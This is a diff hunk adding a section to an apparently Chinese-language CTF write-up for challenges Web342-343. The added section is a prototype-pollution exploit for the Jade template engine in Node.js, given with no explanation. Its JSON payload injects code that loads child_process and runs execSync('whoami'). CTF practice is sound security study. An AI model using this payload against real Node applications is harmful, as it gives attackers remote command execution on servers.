@@ -131,6 +131,15 @@ module.exports = router;
 
 之后我们前往`url/api`界面发起post包即可获得flag
 
+# Web342-343
+
+这是我的exp，过程不讲自己研究
+
+```php
+
+{"__proto__":{"__proto__": {"type":"Code","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );jade_debug.unshift(new jade.DebugItem(0"}}}
+```
+
 
 
 # Web344
